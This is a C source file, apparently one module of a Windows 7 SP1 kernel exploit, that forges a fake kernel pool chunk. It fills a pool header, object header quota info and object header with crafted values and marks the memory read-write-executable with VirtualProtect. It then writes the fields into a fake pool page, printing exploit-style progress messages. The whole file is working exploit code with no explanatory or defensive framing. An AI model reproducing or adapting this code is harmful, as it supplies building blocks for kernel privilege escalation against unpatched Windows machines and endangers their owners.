#include "exploit.h"

void initialize_pool_header_w7_SP1(PPOOL_HEADER_W7_SP1 input_pool_header)
{
	POOL_HEADER_W7_SP1 pool_header = *input_pool_header;	// dt nt!_POOL_HEADER fffffa80c14f72d0 

	pool_header.Ulong1 = 0x202002C;							// Structure Offset: +0x0, Overall Offset: +0x0
	pool_header.PoolTag = 0x4B677844;						// Structure Offset: +0x4, Overall Offset: +0x4
	pool_header.ProcessBilled = 0;							// Structure Offset: +0x8, Overall Offset: +0x8

	*input_pool_header = pool_header;
}

void initialize_object_header_quota_w7_SP1(POBJECT_HEADER_QUOTA_INFO_W7_SP1 input_object_header_quota)
{
	OBJECT_HEADER_QUOTA_INFO_W7_SP1 object_header_quota = *input_object_header_quota;	// dt nt!_OBJECT_HEADER_QUOTA_INFO fffffa80c14f72d0+0x10

	object_header_quota.PagedPoolCharge = 0x2100002;									// Structure Offset: +0x0, Overall Offset: +0x10
	object_header_quota.NonPagedPoolCharge = 0x69656C41;								// Structure Offset: +0x4, Overall Offset: +0x14
	object_header_quota.SecurityDescriptorCharge = 1;									// Structure Offset: +0x8, Overall Offset: +0x18
	// PADDING: 4 BYTES																	// Structure Offset: +0xC, Overall Offset: +0x1C
	object_header_quota.SecurityDescriptorQuotaBlock = (void*)0x69656C41060F0001;		// Structure Offset: +0x10, Overall Offset: +0x20
	object_header_quota.Reserved = 0;													// Structure Offset: +0x18, Overall Offset: +0x28

	*input_object_header_quota = object_header_quota;
}

void initialize_object_header_w7_SP1(POBJECT_HEADER_W7_SP1 input_object_header)
{
	OBJECT_HEADER_W7_SP1 object_header = *input_object_header;				// dt nt!_OBJECT_HEADER fffffa80c14f72d0+0x30

	object_header.PointerCount = 0;											// Structure Offset: +0x0, Overall Offset: +0x30
	object_header.HandleCount = 0;											// Structure Offset: +0x8, Overall Offset: +0x38
	object_header.Lock = (PVOID)0;											// Structure Offset: +0x10, Overall Offset: +0x40
	object_header.TypeIndex = 0;											// Structure Offset: +0x18, Overall Offset: +0x48
	object_header.TraceFlags = 0;											// Structure Offset: +0x19, Overall Offset: +0x49
	object_header.InfoMask = 0;												// Structure Offset: +0x1A, Overall Offset: +0x4A
	object_header.Flags = 0;												// Structure Offset: +0x1B, Overall Offset: +0x4B
	// PADDING: 4 BYTES														// Structure Offset: +0x1C, Overall Offset: +0x4C
	object_header.ObjectCreateInfo = (PVOID)0;								// Structure Offset: +0x20, Overall Offset: +0x50
	object_header.SecurityDescriptor = (void*)0x0000001869656C41;			// Structure Offset: +0x28, Overall Offset: +0x58
	object_header.Body = (PVOID)0;											// Structure Offset: +0x30, Overall Offset: +0x60

	*input_object_header = object_header;
}

int mark_pool_structs_executable_w7_SP1(PPOOL_HEADER_W7_SP1 input_pool_header, POBJECT_HEADER_QUOTA_INFO_W7_SP1 input_object_header_quota, POBJECT_HEADER_W7_SP1 input_object_header)
{
	char unused = 0;
	unsigned long old_protection = 0;

	if (!VirtualProtect(input_pool_header, sizeof(POOL_HEADER_W7_SP1), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the pool header structure as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the pool header structure as read+write+executable.");

	if (!VirtualProtect(input_object_header_quota, sizeof(OBJECT_HEADER_QUOTA_INFO_W7_SP1), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the object header quota info structure as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the object header quota info structure as read+write+executable.");

	if (!VirtualProtect(input_object_header, sizeof(OBJECT_HEADER_W7_SP1), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the object header structure as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the object header structure as read+write+executable.");

	return 0;
}

void initialize_main_pool_structs_w7_SP1(PPOOL_HEADER_W7_SP1 input_pool_header, POBJECT_HEADER_QUOTA_INFO_W7_SP1 input_object_header_quota, POBJECT_HEADER_W7_SP1 input_object_header)
{
	initialize_pool_header_w7_SP1(input_pool_header);
	printf("[+] Initialized fake pool header.");

	initialize_object_header_quota_w7_SP1(input_object_header_quota);
	printf("\n[+] Initialized fake object header quota.");

	initialize_object_header_w7_SP1(input_object_header);
	printf("\n[+] Initialized fake object header.");
}

void build_pool_chunk_w7_SP1(char* fake_pool_memory_page, POOL_HEADER_W7_SP1 pool_header, OBJECT_HEADER_QUOTA_INFO_W7_SP1 object_header_quota_info, OBJECT_HEADER_W7_SP1 object_header)
{
	*(PULONG)(fake_pool_memory_page + 0x0) = pool_header.Ulong1;
	*(PULONG)(fake_pool_memory_page + 0x4) = pool_header.PoolTag;
	*(PULONGLONG)(fake_pool_memory_page + 0x8) = pool_header.ProcessBilled;
	printf("\n[+] Built pool header.");

	*(PULONG)(fake_pool_memory_page + 0x10) = object_header_quota_info.PagedPoolCharge;
	*(PULONG)(fake_pool_memory_page + 0x14) = object_header_quota_info.NonPagedPoolCharge;
	*(PULONG)(fake_pool_memory_page + 0x18) = object_header_quota_info.SecurityDescriptorCharge;
	*(PULONG)(fake_pool_memory_page + 0x1C) = (ULONG)0;
	*(PULONGLONG)(fake_pool_memory_page + 0x20) = object_header_quota_info.SecurityDescriptorQuotaBlock;
	*(PULONGLONG)(fake_pool_memory_page + 0x28) = object_header_quota_info.Reserved;
	printf("\n[+] Built object header quota info.");

	*(PLONGLONG)(fake_pool_memory_page + 0x30) = object_header.PointerCount;
	*(PLONGLONG)(fake_pool_memory_page + 0x38) = object_header.HandleCount;
	*(PULONGLONG)(fake_pool_memory_page + 0x40) = object_header.Lock;
	*(PUCHAR)(fake_pool_memory_page + 0x48) = object_header.TypeIndex;
	*(PUCHAR)(fake_pool_memory_page + 0x49) = object_header.TraceFlags;
	*(PUCHAR)(fake_pool_memory_page + 0x4A) = object_header.InfoMask;
	*(PUCHAR)(fake_pool_memory_page + 0x4B) = object_header.Flags;
	*(PULONG)(fake_pool_memory_page + 0x4C) = (ULONG)0;
	*(PULONGLONG)(fake_pool_memory_page + 0x50) = object_header.ObjectCreateInfo;
	*(PULONGLONG)(fake_pool_memory_page + 0x58) = object_header.SecurityDescriptor;
	*(PULONGLONG)(fake_pool_memory_page + 0x60) = object_header.Body;
	printf("\n[+] Built object header.");
}